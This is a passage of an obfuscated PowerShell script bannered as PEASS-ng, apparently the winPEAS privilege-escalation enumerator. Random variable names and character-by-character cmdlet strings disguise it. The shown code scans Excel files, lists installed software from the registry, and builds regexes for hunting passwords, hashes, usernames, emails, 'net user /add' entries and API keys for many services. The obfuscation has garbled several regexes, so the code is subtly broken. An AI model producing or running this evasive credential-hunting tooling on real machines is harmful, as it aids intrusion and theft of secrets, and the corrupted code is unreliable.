              Column = $BYnDrgXDeTKYmSdHdnlFhSggFLGSlBXRMNRsYFQkFmihOHNQfRiwfhgKRtsFyoQbloIXluwgYNjOGrOaFNMllBRwCzZmQlQhBmHn.Column
              Row =$BYnDrgXDeTKYmSdHdnlFhSggFLGSlBXRMNRsYFQkFmihOHNQfRiwfhgKRtsFyoQbloIXluwgYNjOGrOaFNMllBRwCzZmQlQhBmHn.Row
              TextMatch = $BYnDrgXDeTKYmSdHdnlFhSggFLGSlBXRMNRsYFQkFmihOHNQfRiwfhgKRtsFyoQbloIXluwgYNjOGrOaFNMllBRwCzZmQlQhBmHn.Text
              Address = $BTuSlyDsVcCEbYrEFpFkuMUsbqLdpUQiyWZUpcefmZWrDbOJsvuWdXwLWXzIXerbGSwAnNPQuWrbBmHnluAOovFczUonPlHHFHtp
          })
          Do {
              $BYnDrgXDeTKYmSdHdnlFhSggFLGSlBXRMNRsYFQkFmihOHNQfRiwfhgKRtsFyoQbloIXluwgYNjOGrOaFNMllBRwCzZmQlQhBmHn = $KrWqmbWNXMJxXUBQlYiwmzhLIFZuznogRDaDKjQpGAYJaMPhJWhLVsWWdYkZYEHhGwHsfZLkRYjodpZsQLXglcjSOKKwRYrjvIHl.Cells.FindNext($BYnDrgXDeTKYmSdHdnlFhSggFLGSlBXRMNRsYFQkFmihOHNQfRiwfhgKRtsFyoQbloIXluwgYNjOGrOaFNMllBRwCzZmQlQhBmHn)
              $inznNdenGvogZMKLUeTdpHTZXQJegClrkwjSNxfKXDKPiqvMHvBbbaBNQylpzMBhUkLghKWauOsDYMDmUjtfwWXwSxGNVHaTiQjk = $BYnDrgXDeTKYmSdHdnlFhSggFLGSlBXRMNRsYFQkFmihOHNQfRiwfhgKRtsFyoQbloIXluwgYNjOGrOaFNMllBRwCzZmQlQhBmHn.Address(0,0,1,1)
              If ($inznNdenGvogZMKLUeTdpHTZXQJegClrkwjSNxfKXDKPiqvMHvBbbaBNQylpzMBhUkLghKWauOsDYMDmUjtfwWXwSxGNVHaTiQjk -eq $BTuSlyDsVcCEbYrEFpFkuMUsbqLdpUQiyWZUpcefmZWrDbOJsvuWdXwLWXzIXerbGSwAnNPQuWrbBmHnluAOovFczUonPlHHFHtp) {
                &('W' + 'r' + 'i' + 't' + 'e' + '-' + 'h' + 'o' + 's' + 't') "Address is same as Begin Address"
                  BREAK
              }
              &('N' + 'e' + 'w' + '-' + 'O' + 'b' + 'j' + 'e' + 'c' + 't') -TypeName PSObject -Property ([Ordered]@{
                  WorkSheet = $KrWqmbWNXMJxXUBQlYiwmzhLIFZuznogRDaDKjQpGAYJaMPhJWhLVsWWdYkZYEHhGwHsfZLkRYjodpZsQLXglcjSOKKwRYrjvIHl.Name
                  Column = $BYnDrgXDeTKYmSdHdnlFhSggFLGSlBXRMNRsYFQkFmihOHNQfRiwfhgKRtsFyoQbloIXluwgYNjOGrOaFNMllBRwCzZmQlQhBmHn.Column
                  Row =$BYnDrgXDeTKYmSdHdnlFhSggFLGSlBXRMNRsYFQkFmihOHNQfRiwfhgKRtsFyoQbloIXluwgYNjOGrOaFNMllBRwCzZmQlQhBmHn.Row
                  TextMatch = $BYnDrgXDeTKYmSdHdnlFhSggFLGSlBXRMNRsYFQkFmihOHNQfRiwfhgKRtsFyoQbloIXluwgYNjOGrOaFNMllBRwCzZmQlQhBmHn.Text
                  Address = $inznNdenGvogZMKLUeTdpHTZXQJegClrkwjSNxfKXDKPiqvMHvBbbaBNQylpzMBhUkLghKWauOsDYMDmUjtfwWXwSxGNVHaTiQjk
              })                
          } Until ($False)
        }
        catch {
        }
      }
  }
  try{
  $AxUGThlSwsARXLReYTWoRiZhLjYpCJgYGlgHklXAvMzcKmYvNLgJYpuUCVTZkLuoWJZcGDAcPQDFlERHKZxQzUApfLUEPQqSMydd.close($False)
  [void][System.Runtime.InteropServices.Marshal]::ReleaseComObject([System.__ComObject]$excel)
  [gc]::Collect()
  [gc]::WaitForPendingFinalizers()
  }
  catch{
  }
  &('R' + 'e' + 'm' + 'o' + 'v' + 'e' + '-' + 'V' + 'a' + 'r' + 'i' + 'a' + 'b' + 'l' + 'e') excel -ErrorAction SilentlyContinue
}

function Get-InstalledApplications {
[cmdletbinding()]
param(
  [Parameter(DontShow)]
  $NRORbqwJEAVZazISBsYYQIgjNeqJgcqUFJubkGDjPzgcgVARSDIEakhuTGIyDBGUkuYlPoxoOhAOxVgXyLFmdXWQfljKAquVnlQs = @('','\Wow6432Node')
)
  foreach($eVUnSLUUDbhiofOkxvOfDgpNdxDjAUWWUZXZlixfHNaWuYebcLkZFZvRcMXvoQKvTaIDQbyynEredMECUOeEWkHDQUEBAzXeWZZw in $NRORbqwJEAVZazISBsYYQIgjNeqJgcqUFJubkGDjPzgcgVARSDIEakhuTGIyDBGUkuYlPoxoOhAOxVgXyLFmdXWQfljKAquVnlQs) {
      try {
        $lBwoZIOXPLQsxNbLtSNNAHEhDzTZLXBGCghqEdLokCEMfEUZQPiPInjbBYIMEgUdeGjRwOkEmMUzgJtGLvZKZkJZDVlZjonqbzXD = [Microsoft.Win32.RegistryKey]::OpenRemoteBaseKey('LocalMachine',$XQliEydMNlmTlvXtzFzbYpoDAfKdoUSFpJJQzELLTNVRaqIenvmXNaKUUtqGhKqVeHIAejMMZUPjIGPKDIWeRrgcSKqpqmGFLYSg:COMPUTERNAME).OpenSubKey("SOFTWARE$eVUnSLUUDbhiofOkxvOfDgpNdxDjAUWWUZXZlixfHNaWuYebcLkZFZvRcMXvoQKvTaIDQbyynEredMECUOeEWkHDQUEBAzXeWZZw\Microsoft\Windows\CurrentVersion\Uninstall").GetSubKeyNames()
      }
      catch { 
        Continue 
      }
    foreach($ZtbeTORtxHKEHOUxPjiBxXamksAFDUACAASbrwZKaGvljudqFBLCQWmghtzItWjSdYeHyHJCuNACdmHkdWufFQufkjVsSSZdNHtH in $lBwoZIOXPLQsxNbLtSNNAHEhDzTZLXBGCghqEdLokCEMfEUZQPiPInjbBYIMEgUdeGjRwOkEmMUzgJtGLvZKZkJZDVlZjonqbzXD) {
        $BWkMCOvrHOGKwPhRpUjcDOldUVjathcqPwMtuUQqdwhIOFAYeGOJUcCjcFBLLEUYVfKDWayMdJJMQAEYRoJCXOnCCxrgxctKvutb = [Microsoft.Win32.RegistryKey]::OpenRemoteBaseKey('LocalMachine',$XQliEydMNlmTlvXtzFzbYpoDAfKdoUSFpJJQzELLTNVRaqIenvmXNaKUUtqGhKqVeHIAejMMZUPjIGPKDIWeRrgcSKqpqmGFLYSg:COMPUTERNAME).OpenSubKey("SOFTWARE$eVUnSLUUDbhiofOkxvOfDgpNdxDjAUWWUZXZlixfHNaWuYebcLkZFZvRcMXvoQKvTaIDQbyynEredMECUOeEWkHDQUEBAzXeWZZw\Microsoft\Windows\CurrentVersion\Uninstall\$ZtbeTORtxHKEHOUxPjiBxXamksAFDUACAASbrwZKaGvljudqFBLCQWmghtzItWjSdYeHyHJCuNACdmHkdWufFQufkjVsSSZdNHtH")
        $ssWkiSwkzsOuwAmGtJjPCftbmJwyjHNcWRZFyInHsPKlHnKXGPHvaqWQuNfvzUJOctlmBKWPkqXsQtHpvTQWzuLkGMoVivreXkDz = $BWkMCOvrHOGKwPhRpUjcDOldUVjathcqPwMtuUQqdwhIOFAYeGOJUcCjcFBLLEUYVfKDWayMdJJMQAEYRoJCXOnCCxrgxctKvutb.GetValue('DisplayName')
      if($ssWkiSwkzsOuwAmGtJjPCftbmJwyjHNcWRZFyInHsPKlHnKXGPHvaqWQuNfvzUJOctlmBKWPkqXsQtHpvTQWzuLkGMoVivreXkDz) {
        &('N' + 'e' + 'w' + '-' + 'O' + 'b' + 'j' + 'e' + 'c' + 't') -TypeName PSObject -Property ([Ordered]@{       
              Computername = $XQliEydMNlmTlvXtzFzbYpoDAfKdoUSFpJJQzELLTNVRaqIenvmXNaKUUtqGhKqVeHIAejMMZUPjIGPKDIWeRrgcSKqpqmGFLYSg:COMPUTERNAME
              Software = $ssWkiSwkzsOuwAmGtJjPCftbmJwyjHNcWRZFyInHsPKlHnKXGPHvaqWQuNfvzUJOctlmBKWPkqXsQtHpvTQWzuLkGMoVivreXkDz 
              Version = $BWkMCOvrHOGKwPhRpUjcDOldUVjathcqPwMtuUQqdwhIOFAYeGOJUcCjcFBLLEUYVfKDWayMdJJMQAEYRoJCXOnCCxrgxctKvutb.GetValue("DisplayVersion")
              Publisher = $BWkMCOvrHOGKwPhRpUjcDOldUVjathcqPwMtuUQqdwhIOFAYeGOJUcCjcFBLLEUYVfKDWayMdJJMQAEYRoJCXOnCCxrgxctKvutb.GetValue("Publisher")
              InstallDate = $BWkMCOvrHOGKwPhRpUjcDOldUVjathcqPwMtuUQqdwhIOFAYeGOJUcCjcFBLLEUYVfKDWayMdJJMQAEYRoJCXOnCCxrgxctKvutb.GetValue("InstallDate")
              UninstallString = $BWkMCOvrHOGKwPhRpUjcDOldUVjathcqPwMtuUQqdwhIOFAYeGOJUcCjcFBLLEUYVfKDWayMdJJMQAEYRoJCXOnCCxrgxctKvutb.GetValue("UninstallString")
              Architecture = $(if($eVUnSLUUDbhiofOkxvOfDgpNdxDjAUWWUZXZlixfHNaWuYebcLkZFZvRcMXvoQKvTaIDQbyynEredMECUOeEWkHDQUEBAzXeWZZw -eq '\wow6432node') {'x86'}else{'x64'})
              Path = $BWkMCOvrHOGKwPhRpUjcDOldUVjathcqPwMtuUQqdwhIOFAYeGOJUcCjcFBLLEUYVfKDWayMdJJMQAEYRoJCXOnCCxrgxctKvutb.Name
        })
      }
    }
  }
}

function Write-Color([String[]]$jadWCliOYnZhkAUluyLhOIrKIVJScGnwQTwudnKnYKPZCVwaKPQITSEHNIInbuNFSLGZimmyNbVxElqGFgHSiwVHZwpDIkRWRDUO, [ConsoleColor[]]$FNzsgLcyEhSNqUjHxOSefjLEKPwLTejQemyMdBEEnVLbasecQCEebPwdAYSSUrANlalVRWqBCsqkxhBErBnMqTWjoDmjzsGDSUAN) {
  for ($UfhZMcKqwqxOeIivbVGHmDTPMQrZgkzKHZqEAvkNvPkinzFCYzqjXuyKYLmrWnuuLYpPcwoNiKFinfsHTDMGuNAzUNKefRQMcgEK = 0; $UfhZMcKqwqxOeIivbVGHmDTPMQrZgkzKHZqEAvkNvPkinzFCYzqjXuyKYLmrWnuuLYpPcwoNiKFinfsHTDMGuNAzUNKefRQMcgEK -lt $jadWCliOYnZhkAUluyLhOIrKIVJScGnwQTwudnKnYKPZCVwaKPQITSEHNIInbuNFSLGZimmyNbVxElqGFgHSiwVHZwpDIkRWRDUO.Length; $UfhZMcKqwqxOeIivbVGHmDTPMQrZgkzKHZqEAvkNvPkinzFCYzqjXuyKYLmrWnuuLYpPcwoNiKFinfsHTDMGuNAzUNKefRQMcgEK++) {
    &('W' + 'r' + 'i' + 't' + 'e' + '-' + 'H' + 'o' + 's' + 't') $jadWCliOYnZhkAUluyLhOIrKIVJScGnwQTwudnKnYKPZCVwaKPQITSEHNIInbuNFSLGZimmyNbVxElqGFgHSiwVHZwpDIkRWRDUO[$UfhZMcKqwqxOeIivbVGHmDTPMQrZgkzKHZqEAvkNvPkinzFCYzqjXuyKYLmrWnuuLYpPcwoNiKFinfsHTDMGuNAzUNKefRQMcgEK] -Foreground $FNzsgLcyEhSNqUjHxOSefjLEKPwLTejQemyMdBEEnVLbasecQCEebPwdAYSSUrANlalVRWqBCsqkxhBErBnMqTWjoDmjzsGDSUAN[$UfhZMcKqwqxOeIivbVGHmDTPMQrZgkzKHZqEAvkNvPkinzFCYzqjXuyKYLmrWnuuLYpPcwoNiKFinfsHTDMGuNAzUNKefRQMcgEK] -NoNewline
  }
  &('W' + 'r' + 'i' + 't' + 'e' + '-' + 'H' + 'o' + 's' + 't')
}


&('W' + 'r' + 'i' + 't' + 'e' + '-' + 'C' + 'o' + 'l' + 'o' + 'r') ",/*,..*(((((((((((((((((((((((((((((((((," -Color Green
&('W' + 'r' + 'i' + 't' + 'e' + '-' + 'C' + 'o' + 'l' + 'o' + 'r') ",*/((((((((((((((((((/,  .*//((//**, .*((((((*" -Color Green
&('W' + 'r' + 'i' + 't' + 'e' + '-' + 'C' + 'o' + 'l' + 'o' + 'r') "((((((((((((((((", "* *****,,,", "\########## .(* ,((((((" -Color Green, Blue, Green
&('W' + 'r' + 'i' + 't' + 'e' + '-' + 'C' + 'o' + 'l' + 'o' + 'r') "(((((((((((", "/*******************", "####### .(. ((((((" -Color Green, Blue, Green
&('W' + 'r' + 'i' + 't' + 'e' + '-' + 'C' + 'o' + 'l' + 'o' + 'r') "(((((((", "/******************", "/@@@@@/", "***", "\#######\((((((" -Color Green, Blue, White, Blue, Green
&('W' + 'r' + 'i' + 't' + 'e' + '-' + 'C' + 'o' + 'l' + 'o' + 'r') ",,..", "**********************", "/@@@@@@@@@/", "***", ",#####.\/(((((" -Color Green, Blue, White, Blue, Green
&('W' + 'r' + 'i' + 't' + 'e' + '-' + 'C' + 'o' + 'l' + 'o' + 'r') ", ,", "**********************", "/@@@@@+@@@/", "*********", "##((/ /((((" -Color Green, Blue, White, Blue, Green
&('W' + 'r' + 'i' + 't' + 'e' + '-' + 'C' + 'o' + 'l' + 'o' + 'r') "..(((##########", "*********", "/#@@@@@@@@@/", "*************", ",,..((((" -Color Green, Blue, White, Blue, Green
&('W' + 'r' + 'i' + 't' + 'e' + '-' + 'C' + 'o' + 'l' + 'o' + 'r') ".(((################(/", "******", "/@@@@@/", "****************", ".. /((" -Color Green, Blue, White, Blue, Green
&('W' + 'r' + 'i' + 't' + 'e' + '-' + 'C' + 'o' + 'l' + 'o' + 'r') ".((########################(/", "************************", "..*(" -Color Green, Blue, Green
&('W' + 'r' + 'i' + 't' + 'e' + '-' + 'C' + 'o' + 'l' + 'o' + 'r') ".((#############################(/", "********************", ".,(" -Color Green, Blue, Green
&('W' + 'r' + 'i' + 't' + 'e' + '-' + 'C' + 'o' + 'l' + 'o' + 'r') ".((##################################(/", "***************", "..(" -Color Green, Blue, Green
&('W' + 'r' + 'i' + 't' + 'e' + '-' + 'C' + 'o' + 'l' + 'o' + 'r') ".((######################################(/", "***********", "..(" -Color Green, Blue, Green
&('W' + 'r' + 'i' + 't' + 'e' + '-' + 'C' + 'o' + 'l' + 'o' + 'r') ".((######", "(,.***.,(", "###################", "(..***", "(/*********", "..(" -Color Green, Green, Green, Green, Blue, Green
&('W' + 'r' + 'i' + 't' + 'e' + '-' + 'C' + 'o' + 'l' + 'o' + 'r') ".((######*", "(####((", "###################", "((######", "/(********", "..(" -Color Green, Green, Green, Green, Blue, Green
&('W' + 'r' + 'i' + 't' + 'e' + '-' + 'C' + 'o' + 'l' + 'o' + 'r') ".((##################", "(/**********(", "################(**...(" -Color Green, Green, Green
&('W' + 'r' + 'i' + 't' + 'e' + '-' + 'C' + 'o' + 'l' + 'o' + 'r') ".(((####################", "/*******(", "###################.((((" -Color Green, Green, Green
&('W' + 'r' + 'i' + 't' + 'e' + '-' + 'C' + 'o' + 'l' + 'o' + 'r') ".(((((############################################/  /((" -Color Green
&('W' + 'r' + 'i' + 't' + 'e' + '-' + 'C' + 'o' + 'l' + 'o' + 'r') "..(((((#########################################(..(((((." -Color Green
&('W' + 'r' + 'i' + 't' + 'e' + '-' + 'C' + 'o' + 'l' + 'o' + 'r') "....(((((#####################################( .((((((." -Color Green
&('W' + 'r' + 'i' + 't' + 'e' + '-' + 'C' + 'o' + 'l' + 'o' + 'r') "......(((((#################################( .(((((((." -Color Green
&('W' + 'r' + 'i' + 't' + 'e' + '-' + 'C' + 'o' + 'l' + 'o' + 'r') "(((((((((. ,(############################(../(((((((((." -Color Green
&('W' + 'r' + 'i' + 't' + 'e' + '-' + 'C' + 'o' + 'l' + 'o' + 'r') "  (((((((((/,  ,####################(/..((((((((((." -Color Green
&('W' + 'r' + 'i' + 't' + 'e' + '-' + 'C' + 'o' + 'l' + 'o' + 'r') "        (((((((((/,.  ,*//////*,. ./(((((((((((." -Color Green
&('W' + 'r' + 'i' + 't' + 'e' + '-' + 'C' + 'o' + 'l' + 'o' + 'r') "           (((((((((((((((((((((((((((/" -Color Green
&('W' + 'r' + 'i' + 't' + 'e' + '-' + 'C' + 'o' + 'l' + 'o' + 'r') "          by &('P' + 'E' + 'A' + 'S' + 'S' + '-' + 'n' + 'g') & RandolphConley" -Color Green



$thgjrIjouIaAzpJPbVCgMsbjXtNUjxJuftYEAvhhTkrSqmWIHImXhDojhlEJUtvZQbRDpdXwvCsvEUebxNxhYnOSemEUbvhzUFPR = $true
$LWlahZIHqIYFEqcgRLKJjLASOBSMYtobMsMMipnlAILCvtRkPbSXqGxDQUPfrOJvhQmuoiFAuWUuOMEBaIDfjYteurYgAeECNnXf = $true
$hHaNAtbucBAnoTfarLqwvSjlEAlJvGofFLdhJtrkeCHTcdQDDKxFktJvtubJcFEcHlZBzeCjptqpOwfGVGfulMZLEmzRVXHYSSZc = $true

$BJbQjlyMxOXcRfjhQsNaApeStkICxqyVABBDdEEsKjqoUBwuKKyJTBFnvKNTqhqeJeJNjTJSaOluvTaXLBNXuqPboPsbQSDcatGh = @{}

if ($thgjrIjouIaAzpJPbVCgMsbjXtNUjxJuftYEAvhhTkrSqmWIHImXhDojhlEJUtvZQbRDpdXwvCsvEUebxNxhYnOSemEUbvhzUFPR) {
  $BJbQjlyMxOXcRfjhQsNaApeStkICxqyVABBDdEEsKjqoUBwuKKyJTBFnvKNTqhqeJeJNjTJSaOluvTaXLBNXuqPboPsbQSDcatGh.add("Simple Passwords1", "pass.*[=:].+")
  $BJbQjlyMxOXcRfjhQsNaApeStkICxqyVABBDdEEsKjqoUBwuKKyJTBFnvKNTqhqeJeJNjTJSaOluvTaXLBNXuqPboPsbQSDcatGh.add("Simple Passwords2", "pwd.*[=:].+")
  $BJbQjlyMxOXcRfjhQsNaApeStkICxqyVABBDdEEsKjqoUBwuKKyJTBFnvKNTqhqeJeJNjTJSaOluvTaXLBNXuqPboPsbQSDcatGh.add("Apr1 MD5", '\$CSaKnPaYHJDZrTXImVCuAxlWVyuKTocrpimYieEXSfAhOOSBYmaNYwnnoWUHwLKRSrENnZBibGuTNNxrjIJautRVpTpsRmWWXPli\$[&('a' + '-' + 'z' + 'A')-Z0-9_/\.]{8}\$[&('a' + '-' + 'z' + 'A')-Z0-9_/\.]{22}')
  $BJbQjlyMxOXcRfjhQsNaApeStkICxqyVABBDdEEsKjqoUBwuKKyJTBFnvKNTqhqeJeJNjTJSaOluvTaXLBNXuqPboPsbQSDcatGh.add("Apache SHA", "\{SHA\}[0-9a-&('z' + 'A' + '-' + 'Z')/_=]{10,}")
  $BJbQjlyMxOXcRfjhQsNaApeStkICxqyVABBDdEEsKjqoUBwuKKyJTBFnvKNTqhqeJeJNjTJSaOluvTaXLBNXuqPboPsbQSDcatGh.add("Blowfish", '\$2[abxyz]?\$[0-9]{2}\$[&('a' + '-' + 'z' + 'A')-Z0-9_/\.]*')
  $BJbQjlyMxOXcRfjhQsNaApeStkICxqyVABBDdEEsKjqoUBwuKKyJTBFnvKNTqhqeJeJNjTJSaOluvTaXLBNXuqPboPsbQSDcatGh.add("Drupal", '\$cyIXTAmcvzKFhjbRMZHQxKyUPtynSUKjjrYQpVKUtpswfPyqBjEccpZsHiuiBFUbxhIIgqTksYTKWkuLRcUXWMlORnHceSpzIMaF\$[&('a' + '-' + 'z' + 'A')-Z0-9_/\.]{52}')
  $BJbQjlyMxOXcRfjhQsNaApeStkICxqyVABBDdEEsKjqoUBwuKKyJTBFnvKNTqhqeJeJNjTJSaOluvTaXLBNXuqPboPsbQSDcatGh.add("Joomlavbulletin", "[0-9a-&('z' + 'A' + '-' + 'Z')]{32}:[a-&('z' + 'A' + '-' + 'Z')0-9_]{16,32}")
  $BJbQjlyMxOXcRfjhQsNaApeStkICxqyVABBDdEEsKjqoUBwuKKyJTBFnvKNTqhqeJeJNjTJSaOluvTaXLBNXuqPboPsbQSDcatGh.add("Linux MD5", '\$1\$[&('a' + '-' + 'z' + 'A')-Z0-9_/\.]{8}\$[&('a' + '-' + 'z' + 'A')-Z0-9_/\.]{22}')
  $BJbQjlyMxOXcRfjhQsNaApeStkICxqyVABBDdEEsKjqoUBwuKKyJTBFnvKNTqhqeJeJNjTJSaOluvTaXLBNXuqPboPsbQSDcatGh.add("phpbb3", '\$uBMsunnNWCvLUEkbQqeikPDXbGFppekUziIOmbZMZeguNtGJaesgtYvboXNTlaJCjeRFevHJhHCoxzNqWNgDgukYJuxfaNCEfwDy\$[&('a' + '-' + 'z' + 'A')-Z0-9_/\.]{31}')
  $BJbQjlyMxOXcRfjhQsNaApeStkICxqyVABBDdEEsKjqoUBwuKKyJTBFnvKNTqhqeJeJNjTJSaOluvTaXLBNXuqPboPsbQSDcatGh.add("sha512crypt", '\$6\$[&('a' + '-' + 'z' + 'A')-Z0-9_/\.]{16}\$[&('a' + '-' + 'z' + 'A')-Z0-9_/\.]{86}')
  $BJbQjlyMxOXcRfjhQsNaApeStkICxqyVABBDdEEsKjqoUBwuKKyJTBFnvKNTqhqeJeJNjTJSaOluvTaXLBNXuqPboPsbQSDcatGh.add("Wordpress", '\$cpEAPYsWFjshIzbtBAvuUinsyVDvIeLzOnxQZybYNntvcpxLqeDpbaYQCtWDmimplnCroPjlCpoPwlCnqcumKicxLeYvKwcvPrHt\$[&('a' + '-' + 'z' + 'A')-Z0-9_/\.]{31}')
  $BJbQjlyMxOXcRfjhQsNaApeStkICxqyVABBDdEEsKjqoUBwuKKyJTBFnvKNTqhqeJeJNjTJSaOluvTaXLBNXuqPboPsbQSDcatGh.add("md5", "(^|[^&('a' + '-' + 'z' + 'A')-Z0-9])[&('a' + '-' + 'f' + 'A')-F0-9]{32}([^&('a' + '-' + 'z' + 'A')-Z0-9]|$)")
  $BJbQjlyMxOXcRfjhQsNaApeStkICxqyVABBDdEEsKjqoUBwuKKyJTBFnvKNTqhqeJeJNjTJSaOluvTaXLBNXuqPboPsbQSDcatGh.add("sha1", "(^|[^&('a' + '-' + 'z' + 'A')-Z0-9])[&('a' + '-' + 'f' + 'A')-F0-9]{40}([^&('a' + '-' + 'z' + 'A')-Z0-9]|$)")
  $BJbQjlyMxOXcRfjhQsNaApeStkICxqyVABBDdEEsKjqoUBwuKKyJTBFnvKNTqhqeJeJNjTJSaOluvTaXLBNXuqPboPsbQSDcatGh.add("sha256", "(^|[^&('a' + '-' + 'z' + 'A')-Z0-9])[&('a' + '-' + 'f' + 'A')-F0-9]{64}([^&('a' + '-' + 'z' + 'A')-Z0-9]|$)")
  $BJbQjlyMxOXcRfjhQsNaApeStkICxqyVABBDdEEsKjqoUBwuKKyJTBFnvKNTqhqeJeJNjTJSaOluvTaXLBNXuqPboPsbQSDcatGh.add("sha512", "(^|[^&('a' + '-' + 'z' + 'A')-Z0-9])[&('a' + '-' + 'f' + 'A')-F0-9]{128}([^&('a' + '-' + 'z' + 'A')-Z0-9]|$)")  
  $BJbQjlyMxOXcRfjhQsNaApeStkICxqyVABBDdEEsKjqoUBwuKKyJTBFnvKNTqhqeJeJNjTJSaOluvTaXLBNXuqPboPsbQSDcatGh.add("Base64", "(eyJ|YTo|Tzo|PD[89]|aHR0cHM6L|aHR0cDo|rO0)[&('a' + '-' + 'z' + 'A')-Z0-9+\/]+={0,2}")
}

if ($LWlahZIHqIYFEqcgRLKJjLASOBSMYtobMsMMipnlAILCvtRkPbSXqGxDQUPfrOJvhQmuoiFAuWUuOMEBaIDfjYteurYgAeECNnXf) {
  $BJbQjlyMxOXcRfjhQsNaApeStkICxqyVABBDdEEsKjqoUBwuKKyJTBFnvKNTqhqeJeJNjTJSaOluvTaXLBNXuqPboPsbQSDcatGh.add("Usernames1", "username[=:].+")
  $BJbQjlyMxOXcRfjhQsNaApeStkICxqyVABBDdEEsKjqoUBwuKKyJTBFnvKNTqhqeJeJNjTJSaOluvTaXLBNXuqPboPsbQSDcatGh.add("Usernames2", "user[=:].+")
  $BJbQjlyMxOXcRfjhQsNaApeStkICxqyVABBDdEEsKjqoUBwuKKyJTBFnvKNTqhqeJeJNjTJSaOluvTaXLBNXuqPboPsbQSDcatGh.add("Usernames3", "login[=:].+")
  $BJbQjlyMxOXcRfjhQsNaApeStkICxqyVABBDdEEsKjqoUBwuKKyJTBFnvKNTqhqeJeJNjTJSaOluvTaXLBNXuqPboPsbQSDcatGh.add("Emails", "[&('A' + '-' + 'Z' + 'a')-z0-9._%+-]+@[&('A' + '-' + 'Z' + 'a')-z0-9.-]+\.[&('A' + '-' + 'Z' + 'a')-z]{2,6}")
  $BJbQjlyMxOXcRfjhQsNaApeStkICxqyVABBDdEEsKjqoUBwuKKyJTBFnvKNTqhqeJeJNjTJSaOluvTaXLBNXuqPboPsbQSDcatGh.add("Net user add", "net user .+ /add")
}

if ($FullCheck) {
  $BJbQjlyMxOXcRfjhQsNaApeStkICxqyVABBDdEEsKjqoUBwuKKyJTBFnvKNTqhqeJeJNjTJSaOluvTaXLBNXuqPboPsbQSDcatGh.add("Artifactory API Token", "AKC[&('a' + '-' + 'z' + 'A')-Z0-9]{10,}")
  $BJbQjlyMxOXcRfjhQsNaApeStkICxqyVABBDdEEsKjqoUBwuKKyJTBFnvKNTqhqeJeJNjTJSaOluvTaXLBNXuqPboPsbQSDcatGh.add("Artifactory Password", "AP[0-9ABCDEF][&('a' + '-' + 'z' + 'A')-Z0-9]{8,}")
  $BJbQjlyMxOXcRfjhQsNaApeStkICxqyVABBDdEEsKjqoUBwuKKyJTBFnvKNTqhqeJeJNjTJSaOluvTaXLBNXuqPboPsbQSDcatGh.add("Adafruit API Key", "([a-z0-9_-]{32})")
  $BJbQjlyMxOXcRfjhQsNaApeStkICxqyVABBDdEEsKjqoUBwuKKyJTBFnvKNTqhqeJeJNjTJSaOluvTaXLBNXuqPboPsbQSDcatGh.add("Adafruit API Key", "([a-z0-9_-]{32})")
  $BJbQjlyMxOXcRfjhQsNaApeStkICxqyVABBDdEEsKjqoUBwuKKyJTBFnvKNTqhqeJeJNjTJSaOluvTaXLBNXuqPboPsbQSDcatGh.add("Adobe Client Id (Oauth Web)", "(adobe[a-z0-9_ \.,\-]{0,25})(=|>|:=|\|\|:|<=|=>|:).{0,5}['""]([a-f0-9]{32})['""]")
  $BJbQjlyMxOXcRfjhQsNaApeStkICxqyVABBDdEEsKjqoUBwuKKyJTBFnvKNTqhqeJeJNjTJSaOluvTaXLBNXuqPboPsbQSDcatGh.add("Abode Client Secret", "(p8e-)[a-z0-9]{32}")
  $BJbQjlyMxOXcRfjhQsNaApeStkICxqyVABBDdEEsKjqoUBwuKKyJTBFnvKNTqhqeJeJNjTJSaOluvTaXLBNXuqPboPsbQSDcatGh.add("Age Secret Key", "&('A' + 'G' + 'E' + '-' + 'S' + 'E' + 'C' + 'R' + 'E' + 'T')-KEY-1[QPZRY9X8GF2TVDW0S3JN54KHCE6MUA7L]{58}")
  $BJbQjlyMxOXcRfjhQsNaApeStkICxqyVABBDdEEsKjqoUBwuKKyJTBFnvKNTqhqeJeJNjTJSaOluvTaXLBNXuqPboPsbQSDcatGh.add("Airtable API Key", "([a-z0-9]{17})")
  $BJbQjlyMxOXcRfjhQsNaApeStkICxqyVABBDdEEsKjqoUBwuKKyJTBFnvKNTqhqeJeJNjTJSaOluvTaXLBNXuqPboPsbQSDcatGh.add("Alchemi API Key", "(alchemi[a-z0-9_ \.,\-]{0,25})(=|>|:=|\|\|:|<=|=>|:).{0,5}['""]([&('a' + '-' + 'z' + 'A')-Z0-9-]{32})['""]")
  $BJbQjlyMxOXcRfjhQsNaApeStkICxqyVABBDdEEsKjqoUBwuKKyJTBFnvKNTqhqeJeJNjTJSaOluvTaXLBNXuqPboPsbQSDcatGh.add("Artifactory API Key & Password", "[""']AKC[&('a' + '-' + 'z' + 'A')-Z0-9]{10,}[""']|[""']AP[0-9ABCDEF][&('a' + '-' + 'z' + 'A')-Z0-9]{8,}[""']")
  $BJbQjlyMxOXcRfjhQsNaApeStkICxqyVABBDdEEsKjqoUBwuKKyJTBFnvKNTqhqeJeJNjTJSaOluvTaXLBNXuqPboPsbQSDcatGh.add("Atlassian API Key", "(atlassian[a-z0-9_ \.,\-]{0,25})(=|>|:=|\|\|:|<=|=>|:).{0,5}['""]([a-z0-9]{24})['""]")
  $BJbQjlyMxOXcRfjhQsNaApeStkICxqyVABBDdEEsKjqoUBwuKKyJTBFnvKNTqhqeJeJNjTJSaOluvTaXLBNXuqPboPsbQSDcatGh.add("Binance API Key", "(binance[a-z0-9_ \.,\-]{0,25})(=|>|:=|\|\|:|<=|=>|:).{0,5}['""]([&('a' + '-' + 'z' + 'A')-Z0-9]{64})['""]")
  $BJbQjlyMxOXcRfjhQsNaApeStkICxqyVABBDdEEsKjqoUBwuKKyJTBFnvKNTqhqeJeJNjTJSaOluvTaXLBNXuqPboPsbQSDcatGh.add("Bitbucket Client Id", "((bitbucket[a-z0-9_ \.,\-]{0,25})(=|>|:=|\|\|:|<=|=>|:).{0,5}['""]([a-z0-9]{32})['""])")
  $BJbQjlyMxOXcRfjhQsNaApeStkICxqyVABBDdEEsKjqoUBwuKKyJTBFnvKNTqhqeJeJNjTJSaOluvTaXLBNXuqPboPsbQSDcatGh.add("Bitbucket Client Secret", "((bitbucket[a-z0-9_ \.,\-]{0,25})(=|>|:=|\|\|:|<=|=>|:).{0,5}['""]([a-z0-9_\-]{64})['""])")
